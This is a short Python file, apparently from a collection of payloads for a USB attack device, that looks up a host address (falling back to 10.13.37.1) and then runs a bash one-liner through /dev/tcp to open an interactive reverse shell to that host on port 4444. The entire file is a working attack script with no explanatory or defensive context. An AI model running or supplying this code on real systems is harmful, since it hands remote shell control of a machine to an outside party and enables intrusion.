# File: payloads/shell/reverse_to_host.py
import subprocess
import socket

# Dynamically resolve host IP from USB (fallback 10.13.37.1)
def get_usb_host_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        return s.getsockname()[0]
    except Exception:
        return "10.13.37.1"

host_ip = get_usb_host_ip()
print(f"[*] Attempting reverse shell to {host_ip}:4444")

subprocess.run([
    "bash", "-c",
    f"bash -i >& /dev/tcp/{host_ip}/4444 0>&1"
])
